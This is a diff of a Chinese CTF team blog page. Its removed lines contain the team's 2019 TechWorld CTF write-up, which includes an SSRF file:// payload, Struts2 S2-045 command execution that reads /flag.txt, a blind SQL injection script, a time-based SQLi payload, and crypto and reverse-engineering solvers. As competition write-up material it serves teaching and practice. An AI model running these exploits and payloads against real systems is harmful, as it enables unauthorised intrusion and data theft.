@@ -1,22 +1,120 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
-    <id>https://we-ax.github.io</id>
-    <title>We_ax</title>
-    <updated>2019-10-06T13:19:12.284Z</updated>
-    <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="https://we-ax.github.io"/>
-    <link rel="self" href="https://we-ax.github.io/atom.xml"/>
-    <subtitle>We_ax战队官方博客</subtitle>
-    <logo>https://we-ax.github.io/images/avatar.png</logo>
-    <icon>https://we-ax.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2019, We_ax</rights>
-    <entry>
-        <title type="html"><![CDATA[Wectf1--WriteUp]]></title>
-        <id>https://we-ax.github.io/post/wectf1-writeup</id>
-        <link href="https://we-ax.github.io/post/wectf1-writeup">
-        </link>
-        <updated>2019-10-06T12:51:45.000Z</updated>
-        <content type="html"><![CDATA[<p>说明：题目要思路清晰，禁止脑洞。简单题目可以略多一点。主要考察同学们的基本功、进阶式的考察代码审计能力、脚本编写能力。<br>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>
+    Wectf1--WriteUp | We_ax
+</title>
+<link rel="shortcut icon" href="https://we-ax.github.io/favicon.ico?v=1570367949691">
+<!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"> -->
+<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://we-ax.github.io/styles/main.css">
+<!-- js -->
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://we-ax.github.io/media/js/jquery.sticky-sidebar.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/moment.js/2.23.0/moment.min.js"></script>
+
+
+        
+</head>
+
+<body>
+    <div class="main">
+        <div class="header">
+    <div class="nav">
+        <div class="logo">
+            <a href="https://we-ax.github.io">
+                <img class="avatar" src="https://we-ax.github.io/images/avatar.png?v=1570367949691" alt="">
+            </a>
+            <div class="site-title">
+                <h1>
+                    We_ax
+                </h1>
+            </div>
+        </div>
+        <span class="menu-btn fa fa-align-justify"></span>
+        <div class="menu-container">
+            <ul>
+                
+                    
+                            <li>
+                                <a href="/" class="menu">
+                                    首页
+                                </a>
+                            </li>
+                            
+                                
+                    
+                            <li>
+                                <a href="/archives" class="menu">
+                                    归档
+                                </a>
+                            </li>
+                            
+                                
+                    
+                            <li>
+                                <a href="/tags" class="menu">
+                                    标签
+                                </a>
+                            </li>
+                            
+                                
+                    
+                            <li>
+                                <a href="/post/about" class="menu">
+                                    关于
+                                </a>
+                            </li>
+                            
+                                
+            </ul>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(document).ready(function() {
+        $(".menu-btn").click(function() {
+            $(".menu-container").slideToggle();
+        });
+        $(window).resize(function() {
+
+            if (window.matchMedia('(min-width: 960px)').matches) {
+                $(".menu-container").css('display', 'block')
+            } else {
+                $(".menu-container").css('display', 'none')
+            }
+
+        });
+    });
+</script>
+
+            <div id="main-content" class="post-detail main-container">
+                <!-- left -->
+                <div id="content" class="main-container-left">
+                    <article class="post i-card">
+                        <h2 class="post-title">
+                            Wectf1--WriteUp
+                        </h2>
+                        <div class="post-info">
+                            <time class="post-time">2019-10-06</time>
+                            
+                                <a href="https://we-ax.github.io/tag/4REPgFG5c" class="post-tag i-tag
+                            i-tag-other_3">
+                            #writeup
+                        </a>
+                                
+                        </div>
+                        
+                            <div class="post-feature-image" style="background-image: url('https://api.ixiaowai.cn/mcapi/mcapi.php')"></div>
+                            
+                                <div class="post-content">
+                                    <p>说明：题目要思路清晰，禁止脑洞。简单题目可以略多一点。主要考察同学们的基本功、进阶式的考察代码审计能力、脚本编写能力。<br>
 web方向 至少10道，其他方向，至少6道题。</p>
 <p>出题者，在每道题目后，写上自己的出题和解题思路、链接、flag。<br>
 Welcome to the first of WeCTF</p>
@@ -1332,338 +1430,154 @@ p.sendline(payload)
 
 p.interactive()
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[2019 TechWorld 信息安全挑战赛]]></title>
-        <id>https://we-ax.github.io/post/2019-techworld-xin-xi-an-quan-tiao-zhan-sai</id>
-        <link href="https://we-ax.github.io/post/2019-techworld-xin-xi-an-quan-tiao-zhan-sai">
-        </link>
-        <updated>2019-10-05T15:12:17.000Z</updated>
-        <summary type="html"><![CDATA[<p>比赛名称：<strong>2019 TechWorld 信息安全挑战赛</strong><br>
-战队：We_ax</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>比赛名称：<strong>2019 TechWorld 信息安全挑战赛</strong><br>
-战队：We_ax</p>
-<!-- more -->
-<h1 id="web">Web</h1>
-<h3 id="web1">Web1</h3>
-<p>.DS_Store 目录信息泄漏<br>
-通过工具将网站文件下载后，似乎唯一的线索就是一张叫ctf.jpg的图片，猜测是隐写。<br>
-还有一个.git目录，意义不大，文件信息已通过.DS_Store泄漏。<br>
-39.106.184.130:8084/CTF_Can_U_Tell_Me_The_Flag/ctf.jpg<br>
-图片的这个路径也有.DS_Store文件的，扫描一下可能有东西<br>
-git 有泄漏，据说是个假的flag<br>
-<img src="https://we-ax.github.io/post-images/1570288673832.png" alt=""><br>
-git log<br>
-<img src="https://we-ax.github.io/post-images/1570288702283.png" alt=""></p>
-<h3 id=""></h3>
-<h3 id="web2">Web2</h3>
-<p>Gitlab，version很高，目前网络上找不到现成的漏洞，另寻他法，扫目录发现别人的号，进去看了下，发现root发表的仓库，可以找到源码</p>
-<pre><code>&lt;?php
-session_start();
 
-function get_contents($url) {
+                                </div>
+                    </article>
+                    <!--  -->
+                    
+                        <div class="next-post">
+                            <div class="next">下一篇</div>
+                            <a href="https://we-ax.github.io/post/2019-techworld-xin-xi-an-quan-tiao-zhan-sai">
+                                <h3 class="post-title">
+                                    2019 TechWorld 信息安全挑战赛
+                                </h3>
+                            </a>
+                        </div>
+                        
+                            <div id="disqus_thread"></div>
+                            <div id="gitalk-container"></div>
+                </div>
+                <!-- middle -->
+                <div class="main-container-middle"></div>
+                <!-- right -->
+                <div id="sidebar" class="main-container-right">
+                    
+                        <!-- toc -->
+                        
+    <div class="toc-card i-card ">
+        <div class="toc-title i-card-title">目录</div>
+        <div class="toc-content">
+            <ul class="markdownIt-TOC">
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#web%E7%AD%BE%E5%88%B0">web签到</a></li>
+<li><a href="#easy01">easy01</a></li>
+<li><a href="#easy02">easy02</a></li>
+<li><a href="#easy03">easy03</a></li>
+<li><a href="#medium01">medium01</a></li>
+<li><a href="#medium02">medium02</a></li>
+<li><a href="#medium03">medium03</a></li>
+<li><a href="#high01">high01</a></li>
+<li><a href="#high02">high02</a></li>
+<li><a href="#high03">high03</a></li>
+<li><a href="#crazy01">crazy01</a></li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#rot13%E7%AD%BE%E5%88%B0%E9%A2%98">ROT13（签到题）</a></li>
+<li><a href="#%E8%B4%9D%E6%96%AF%E5%AE%B6%E6%97%8F">贝斯家族</a></li>
+<li><a href="#ascii%E7%A0%81">ASCII码</a></li>
+<li><a href="#babypcap">babypcap</a></li>
+<li><a href="#%E8%BF%99%E6%98%AF%E4%B8%AA%E5%95%A5%E4%B8%9C%E8%A5%BF">这是个啥东西</a></li>
+<li><a href="#whoami">whoami</a></li>
+<li><a href="#%E9%92%9B%E5%90%88%E9%87%91%E7%8B%97%E7%9C%BC">钛合金狗眼</a></li>
+<li></li>
+<li><a href="#sksteg">SKsteg</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#%E7%AD%BE%E5%88%B0">签到</a></li>
+<li><a href="#guess">guess</a></li>
+<li><a href="#cxkxcp">cxk=xcp</a></li>
+<li><a href="#%E8%80%81%E5%A5%97%E7%9A%84md5">老套的md5</a></li>
+<li><a href="#babyrsa">babyRSA</a></li>
+<li></li>
+<li><a href="#%E8%84%91%E7%AD%8B%E6%80%A5%E8%BD%AC%E5%BC%AF">脑筋急转弯</a></li>
+<li><a href="#attack-cbc">attack CBC</a></li>
+</ul>
+</li>
+<li><a href="#reverse">Reverse</a>
+<ul>
+<li><a href="#xor">xor</a></li>
+<li><a href="#cmp">cmp</a></li>
+<li><a href="#assembly">assembly</a></li>
+<li><a href="#base64">base64</a></li>
+<li><a href="#king">king</a></li>
+<li><a href="#%E7%BD%91">网</a></li>
+<li><a href="#sign">sign</a></li>
+<li><a href="#emmm">emmm</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a>
+<ul>
+<li><a href="#bof">BOF</a></li>
+<li><a href="#ncpwn%E7%AD%BE%E5%88%B0">nc(pwn签到)</a></li>
+<li><a href="#stack_balance">Stack_balance</a></li>
+<li><a href="#login">Login</a></li>
+<li><a href="#shellcode">Shellcode</a></li>
+<li><a href="#easystack">easystack</a></li>
+<li><a href="#fmt">fmt</a></li>
+<li><a href="#unlink">unlink</a></li>
+</ul>
+</li>
+</ul>
 
-        $curl = curl_init();
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
-        curl_setopt($curl, CURLOPT_TIMEOUT, 3);
-        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
-        curl_setopt($curl, CURLOPT_RESOLVE, array($host . &quot;:&quot; . $port . &quot;:&quot; . $ip)); 
-        curl_setopt($curl, CURLOPT_PORT, $port);
-
-        $data = curl_exec($curl);
-
-        if (curl_error($curl)) {
-            error(curl_error($curl));
-        }
-
-        $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-        if ($status &gt;= 301 and $status &lt;= 308) {
-            $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
-        } else {
-            return $data;
-        }
-
-    }
-
-function error($s) {
-    clear_directory();
-    die(&quot;&lt;h2&gt;&lt;b&gt;ERROR&lt;/b&gt;&lt;/h2&gt; &quot; . htmlspecialchars($s));
-}
-
-$msg = &quot;&quot;;
-if (isset($_GET[&quot;url&quot;])&amp;&amp;&quot;0769cdd4c5a9d8142a08373826c87baa&quot;==md5($_GET[&quot;pass&quot;])) {
-    $msg =  get_contents($_GET[&quot;url&quot;]);    
-}
-?&gt;
-
-&lt;html&gt;
-    &lt;head&gt;&lt;title&gt;找flag!&lt;/title&gt;&lt;/head&gt;
-    &lt;body&gt;
-        &lt;form&gt;
-            &lt;h1&gt;猜一猜flags在哪里！&lt;/h1&gt;
-            &lt;p&gt;&lt;b&gt;请输入URL：&lt;/b&gt;&lt;/p&gt;
-            &lt;p&gt;&lt;input type=&quot;text&quot; size=&quot;100&quot; name=&quot;url&quot;&gt;&lt;/p&gt;
-            &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/p&gt;
-        &lt;/form&gt;
-        &lt;?php if (!empty($msg)) echo &quot;&lt;hr&gt;&lt;p&gt;&quot; . $msg . &quot;&lt;/p&gt;&quot;; ?&gt;
-    &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>乍一看是ssrf，然而并没有任何过滤，估计都能用file协议，所以聚焦点来到此处</p>
-<pre><code>(isset($_GET[&quot;url&quot;])&amp;&amp;&quot;0769cdd4c5a9d8142a08373826c87baa&quot;==md5($_GET[&quot;pass&quot;]))
-</code></pre>
-<p>大概就是 1 与 一个md5 等于另外的md5，后面这个md5部分可控，1与任何数得任何数，解码md5即可，得到ctfun，之后直接file协议。<br>
-payload：<a href="http://39.106.184.130:8085/index.php?pass=ctfun&amp;url=file:///flag.txt">http://39.106.184.130:8085/index.php?pass=ctfun&amp;url=file:///flag.txt</a><br>
-flag{c42e23922b2e2964a7b7f971b1e6548b}</p>
-<h3 id="web3">Web3</h3>
-<p><a href="http://39.106.184.130:8083">http://39.106.184.130:8083</a><a href="http://#go_to_site_file_/struts/webconsole.html">/struts/webconsole.html</a><br>
-Struts控制台，但无法交互（不符合交互条件）<br>
-原因详见：<a href="http://www.mottoin.com/detail/75.html">http://www.mottoin.com/detail/75.html</a><br>
-Java WEB应用路径泄漏：/usr/local/tomcat/webapps/ROOT/WEB</p>
-<hr>
-<p>[<em>] <a href="http://39.106.184.130:8083/">http://39.106.184.130:8083/</a> 存在漏洞: S2-045<br>
-漏洞可利用，可远程执行命令<br>
-（利用脚本来源：<a href="https://www.cnblogs.com/gsharpsh00ter/p/6517952.html">https://www.cnblogs.com/gsharpsh00ter/p/6517952.html）</a><br>
-[</em>] CVE: 2017-5638 - Apache Struts2 S2-045<br>
-[*] cmd: whoami</p>
-<p>tomcat<br>
-根目录下存着flag.txt但无权读取：</p>
-<p>[<em>] CVE: 2017-5638 - Apache Struts2 S2-045<br>
-[</em>] cmd: cat /flag.txt</p>
-<p>cat: /flag.txt: Permission denied</p>
-<p>内核：<br>
-Linux 5cdbb6d5f3c5 4.15.0-52-generic #56-Ubuntu SMP Tue Jun 4 22:49:08 UTC 2019 x86_64 GNU/Linux<br>
-Debian GNU/Linux 9<br>
-应该无法提权，放弃</p>
-<hr>
-<p>[<em>] <a href="http://39.106.184.130:8083/">http://39.106.184.130:8083/</a> 存在漏洞: S2-012<br>
-[</em>] <a href="http://39.106.184.130:8083/">http://39.106.184.130:8083/</a> 存在漏洞: S2-046</p>
-<p>目测可使用start.sh，添加了语句进去，sh执行并不能</p>
-<p>太秀太秀<br>
-tac /flag.txt<br>
-flag{ef7c40a69bb58a7699fa27dd2f10f763}</p>
-<h3 id="-2"></h3>
-<h3 id="web5">Web5</h3>
-<p>sql注入，看其样子就是布尔盲注，有waf，可以测试一下过滤，过滤了很多<br>
-过滤 like + - # = order &quot;union select&quot; ascii &lt;&gt; table_name<br>
-幸好这题只需要拿到database，毕竟table_name都过滤了，<br>
-直接上exp</p>
-<pre><code>import requests
-import string
-s = requests.session()
-baseurl = &quot;http://39.106.184.130:8082/index.php?id=2&quot;
-
-def get_database():
-    database = &quot;&quot;
-    base_len = len(s.get(baseurl).text)
-    for i in range(1,33):
-        for j in string.ascii_lowercase + string.digits:
-            url = baseurl + &quot; and substr(database(),{0},1) in ('{1}')&quot;.format(str(i),str(j))
-            if len(s.get(url).text) == base_len:
-                database += str(j)
-        if len(database) != i:
-            database += &quot;*&quot;
-        print(database)
+        </div>
+        <script>
+            function locateCatelogList() {
+                /*获取文章目录集合,可通过:header过滤器*/
+                var alis = $('.post-content :header');
+                /*获取侧边栏目录列表集合**/
+                var sidebar_alis = $('.markdownIt-TOC a');
+                /*获取滚动条到顶部的距离*/
+                var scroll_height = $(window).scrollTop();
+                for (var i = 0; i < alis.length; i++) {
+                    /*获取锚点集合中的元素分别到顶点的距离*/
+                    var a_height = $(alis[i]).offset().top;
+                    if (a_height < scroll_height) {
+                        /*高亮显示*/
+                        sidebar_alis.removeClass('on');
+                        $(sidebar_alis[i]).addClass('on');
+                    }
+                }
+            }
+            $(function() {
+                /*绑定滚动事件 */
+                $(window).bind('scroll', locateCatelogList);
+            });
+        </script>
+    </div>
     
-if __name__ == '__main__':
-    get_database()
-</code></pre>
-<p><img src="https://we-ax.github.io/post-images/1570288750712.png" alt=""><br>
-截图时候的exp写错了一点，没打到32位，最后一位也是4<br>
-flag{deb7cb73f0ea2b2af2d1e3715fd12044}</p>
-<h3 id="web6">Web6</h3>
-<p>简单题，直接改 xxf： 127.0.0.1<br>
-flag{sgwxsSesSD232se14sdSVSsx}</p>
-<h1 id="misc">Misc</h1>
-<h3 id="misc1">Misc1</h3>
-<p>把a换成1,空格换成0,得到<br>
-<img src="https://we-ax.github.io/post-images/1570288777270.png" alt=""><br>
-发现很有规律<br>
-<img src="https://we-ax.github.io/post-images/1570288803926.png" alt=""><br>
-得到<br>
-MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======<br>
-base32解密后得到ag\bvN+ZnjZNJZ]+m,ibx<br>
-移5位<br>
-<img src="https://we-ax.github.io/post-images/1570288837015.png" alt=""></p>
-<h3 id="naruto">Naruto</h3>
-<figure data-type="image" tabindex="1"><img src="https://we-ax.github.io/post-images/1570289029674.png" alt=""></figure>
-<pre><code>69 61 6D 70 61 73 73 30 72 64
-</code></pre>
-<p>转ASCII</p>
-<pre><code>iampass0rd
-</code></pre>
-<p>从而得知是有密码的隐写<br>
-jphs隐写<br>
-用上面的密码导出flag</p>
-<pre><code>flag{jphid_is_good}
-</code></pre>
-<h3 id="log-analysis">Log analysis</h3>
-<pre><code>cat access.log | grep -v &quot;404&quot; &gt;&gt; not404.log
-</code></pre>
-<p>过滤掉所有 404 请求<br>
-url编码解码得到一堆来自内网的 sql inject<br>
-#web手分析一下sql注入语句。</p>
-<pre><code>GET /vulnerabilities/sqli_blind/?id=123' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM dvwa.flag),1,1))&gt;787634,0,5)))))sbAQ)-- whgI&amp;Submit=Submit
-</code></pre>
-<pre><code>http://www.mianhuage.com/686.html
-猜测 
-' AND (SELECT * FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),38,1))&gt;112,0,1)))))KJQq)--  语句 38表示位数 &gt;112表示判断条件，猜解表名，不断缩小判断范围，最后以!=结束.
-有原题。。直接提交flag
-flag{3287fe300f28e24aefa2d86883832c9f}
-</code></pre>
-<h1 id="crypto">Crypto</h1>
-<h3 id="rsa">Rsa</h3>
-<pre><code>import binascii
-import socket
-from Crypto.Util.number import getPrime,bytes_to_long,long_to_bytes
-def rsa_get_key(e_1, euler):
-    k = 1
-    while True:
-        if (((euler * k) + 1) % e_1) == 0:
-            return (euler * k + 1) // e_1
-        k += 1
+                            
+
+                </div>
 
 
-n=703739435902178622788120837062252491867056043804038443493374414926110815100242619
-e=59159
-c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377
-d=362843528015826034116250472435616782986296050195278657613571087702035376387404519
-p_1=782758164865345954251810941
-p_2=810971978554706690040814093
-p_3=1108609086364627583447802163
-r=(p_1-1)*(p_2-1)*(p_3-1)
-d=rsa_get_key(e,r)
 
 
-m=pow(c,d,n)
-print(&quot;m=&quot;,m)
-b=hex(m)[2:]
-print(b)
-c=binascii.unhexlify(b)
-print(c)
-</code></pre>
-<p>flag{1e257b39a25c6a7c4d66e197}</p>
-<h3 id="-3"></h3>
-<h1 id="reverse">Reverse</h1>
-<h3 id="crackme_high"><strong>Crackme_High</strong></h3>
-<p>接收输入，并判断格式</p>
-<pre><code> GetDlgItemTextA(hDlg, 1000, &amp;String, 255);
-  v1 = GetDlgItemTextA(hDlg, 1001, &amp;input, 255);
-  sscanf(&amp;String, aSDD, &amp;v14, &amp;v33, &amp;v32);
-  if ( v1 &lt; 43 || v1 &gt; 77 )
-  {
-    v2 = 1;
-    goto LABEL_6;
-  }
-  v2 = 0;
-  if ( !sub_4066BC(&amp;input, v1) )                // 只能0-9
-  {
-LABEL_6:
-    sprintf(&amp;Caption, aBadCodeD, v2 + 1);
-    goto LABEL_7;
-  }
-  v3 = strlen(&amp;v14);
-</code></pre>
-<p>后边keygenme201906test经过sha256加密得到9629549d4192ce3cc5a637f6cd9e42e4e4a54bd1e33e765a5acf9b0976150b3b<br>
-进入RSA函数</p>
-<pre><code>int __cdecl RSA(int a1, char *input_string, int strings_0, int string_len, int a5, int a6, int a7)
-{
-  unsigned int v7; // esi
-  int v8; // edi
-  signed int v9; // esi
-  int out_string[3]; // [esp+8h] [ebp-3Ch]
-  int out_input_strings; // [esp+14h] [ebp-30h]
-  char v13; // [esp+20h] [ebp-24h]
-  char out_end; // [esp+2Ch] [ebp-18h]
-  int end_strings[3]; // [esp+38h] [ebp-Ch]
+            </div>
 
-  init(out_string);
-  v7 = *(_DWORD *)(a5 + 4);
-  v8 = *(_DWORD *)(a5 + 8);
-  set_value((int)&amp;out_end, *(_DWORD *)a5);      // v14设为2
-  sub_402405((int)end_strings, (int)&amp;out_end, v7);
-  mpi_add_int((int)&amp;v13, (int)end_strings, v8); // 0+1
-  str2big((int)out_string, strings_0, string_len);// string 是sha256之后的
-  if ( mpi_read_string((int)&amp;out_input_strings, 10, input_string)
-    || (mpi_add_mpi(end_strings, out_string, &amp;out_input_strings), cmp(end_strings, &amp;v13) &gt; 0) )// cmp判断是否为0
-  {
-    v9 = 3;
-  }
-  else
-  {
-    powmod(&amp;out_end, (int)end_strings, a6, (int)&amp;v13);// powmod  幂求mod  a6=0x11
-    set_value((int)end_strings, a7);            // 设置为3
-    v9 = cmp(&amp;out_end, end_strings);            // 相等 最后得等于3
-  }
-  freebig((int)out_string);
-  return v9;
-}
-</code></pre>
-<p>输入字符串从10进制换成16进制后跟9629549d4192ce3cc5a637f6cd9e42e4e4a54bd1e33e765a5acf9b0976150b3b相加<br>
-e=0x11<br>
-n=0x10000000000000000000000000000000000000000000000000000000000000001<br>
-经过加密后跟3对比.<br>
-写解密脚本<br>
-<img src="https://we-ax.github.io/post-images/1570289344577.png" alt=""><br>
-最终得到<br>
-20147921867919287621000423135750575019160522385541100256929307093535644366653<br>
-即flag</p>
-<h3 id="crackme_middle"><strong>Crackme_<strong><strong>M</strong></strong>id****dle</strong></h3>
-<pre><code>v3 = a3;
-  result = a3[64];
-  v5 = a3[65];
-  v6 = a3[66];
-  v16 = a1;
-  if ( a2 )
-  {
-    v15 = a2;
-    while ( 1 )
-    {
-      v19 = (result + 1) &amp; 0x3F;
-      v7 = &amp;v3[v19];
-      v17 = (v3[v19] + v5) &amp; 0x3F;
-      v8 = &amp;v3[v17];
-      v18 = (v19 + *v8) &amp; 0x3F;
-      v9 = *v16;
-      v10 = *v7 ^ *v8;
-      *v7 ^= v10;
-      *v8 ^= v10;
-      v11 = &amp;v3[v18];
-      v12 = *v7 ^ *v11;
-      *v7 ^= v12;
-      *v11 ^= v12;
-      v13 = v16++;
-      v14 = v15-- == 1;
-      *v13 = v9 - ((*v7 + *v8 + *v11) &amp; 0x3F);
-      if ( v14 )
-        break;
-      v5 = v17;
-      result = v19;
-    }
-    v6 = v18;
-    v5 = v17;
-    result = v19;
-  }
-  v3[66] = v6;
-  v3[64] = result;
-  v3[65] = v5;
-  return result;
-}
-</code></pre>
-<p>生成一堆数，输入字符串与之相减，最后对比。</p>
-<pre><code>q = [0x35,0xd,0xe,0x3a,0x0a,0x3f,0x00,0x1e,0x1e,0x1c,0x22,0x27,0x08,0x12,0x1c,0x09]
-i = [0x2E,0x67,0x58,0x29,0x65,0x25,0x65,0x46,0x14,0x14,0x0F,0x12,0x28,0x24,0x15,0x2D]
-flag = &quot;&quot;
 
-for u in range(len(i)):
-</code></pre>
-<p>flag += chr(q[u]+i[u])</p>
-<p>print (flag)</p>
-<p>得ctfcoded20190616</p>
-]]></content>
-    </entry>
-</feed>
+            <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | 
+  <a class="rss" href="https://we-ax.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+
+    </div>
+    <script>
+        $('#sidebar').stickySidebar({
+            topSpacing: 80,
+            // bottomSpacing: 60
+        });
+    </script>
+    
+</body>
+
+</html>
